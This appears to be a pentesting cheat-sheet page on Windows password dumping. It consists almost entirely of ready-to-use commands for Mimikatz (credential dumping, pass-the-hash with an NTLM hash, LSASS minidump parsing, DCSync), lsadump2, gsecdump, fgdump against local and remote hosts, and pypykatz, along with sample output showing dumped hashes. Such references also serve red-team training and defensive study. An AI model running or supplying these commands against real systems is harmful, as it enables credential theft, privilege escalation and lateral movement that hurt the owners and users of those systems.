---
description: >-
  process of obtaining account login and password information, normally in the
  form of a hash or a clear text password.
---

# Password Dumping

## Mimikatz

Mimikatz is a leading post-exploitation tool that dumps passwords from memory, as well as hashes, PINs and Kerberos tickets.

Link: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

### **Quick usage**

Ask for debug privilege for mimikatz process. \(have to be done first\) 

`privilege::debug` 

**Clear screen** 

`Cls` 

**Exit mimikatz**

`Exit` 

### **Examples**

**Dump credentials:** 

```text
privilege::debug  
sekurlsa::logonpasswords
```

  **Pass-The-Hash** 

`mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a` 

**Minidump** 

`mimikatz # sekurlsa::minidump lsass.dmp` 

**DCSync** 

`lsadump::dcsync /domain:pentestlab.local /user:test` 

## lsadump

This is an application to dump the contents of the LSA secrets on a machine, provided you are an Administrator. It uses the same technique as pwdump2 to bypass restrictions that Microsoft added to LsaRetrievePrivateData\(\), which cause the original lsadump to fail. 

Lsadump2 requires Administrator access to run. The usage for lsadump2 is shown here: 

`C:\>lsadump2.exe Lsadump2` - dump an LSA secret. Usage: lsadump2.exe &lt;pid of lsass.exe&gt; &lt;secret&gt; 

You will have to determine the PID of the lsass \(just as with pwdump2\): 

`C:\>tlist | find /i "lsass" 244 LSASS.EXE` 

## gsecdump

gsecdump is a publicly-available credential dumper used to obtain password hashes and LSA secrets from Windows operating systems.

Link: [https://download.openwall.net/pub/projects/john/contrib/win32/pwdump/gsecdump-0.7-win32.zip](https://download.openwall.net/pub/projects/john/contrib/win32/pwdump/gsecdump-0.7-win32.zip)

### example

`C:\Documents and Settings\nobody\Desktop>gsecdump -u gsecdump -u MSHOME\XPSP1VM$::aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`

## FGDump

Cachedump aka In-memory attacks for SAM hashes / Cached Domain Credentials.

Example locally:

```text
C:\Documents and Settings\malware\Bureau\fgdump-2.1.0-exeonly>fgdump.exe 
fgDump 2.1.0 - fizzgig and the mighty group at foofus.net 
Written to make j0m0kun's life just a bit easier 
Copyright(C) 2008 fizzgig and foofus.net 
fgdump comes with ABSOLUTELY NO WARRANTY! 
This is free software, and you are welcome to redistribute it 
under certain conditions; see the COPYING and README files for 
more information. 
--- Session ID: 2014-01-20-19-10-02 --- 
Starting dump on 127.0.0.1 
** Beginning local dump ** 
OS (127.0.0.1): Microsoft Windows XP Professional Service Pack 3 (Build 2600) 
Passwords dumped successfully 
Cache dumped successfully 
-----Summary----- 
Failed servers: 
NONE 
Successful servers: 
127.0.0.1 
Total failed: 0 
Total successful: 1 
```

fgdump has successfully dumped the password hashes: 

```text
C:\Documents and Settings\malware\Bureau\fgdump-2.1.0-exeonly>more 127.0.0.1.pwdump 
Administrateur:500:B0347EB22B87E3F1AAD3B435B51404EE:711EFD7CDC285C11DDFAE2B3D9861DB1::: 
HelpAssistant:1000:6C34BBCD28DD6A8A56088AD6CEFC1BFB:D474527929F6B428B7EA2F7C8B79CE5A::: 
InvitÚ:501:NO PASSWORD*********************:NO PASSWORD*********************::: 
malware:1003:NO PASSWORD*********************:NO PASSWORD*********************::: 
SUPPORT_388945a0:1002:NO PASSWORD*********************:AAB42B496473C917825C842BEACF0B75:::
```

  Dumping the Local Machine Using a Different Account 

`fgdump.exe -h 127.0.0.1 -u AnAdministrativeUser`  

 Dumping a Remote Machine \(192.168.0.10\) Using a Specified User \(1\) 

 `fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -p l4mep4ssw0rd`  

##  pypykatz

Mimikatz implementation in pure Python.

**parsing lsass dump:**

```text
pypykatz lsa minidump lsass.DMP
```

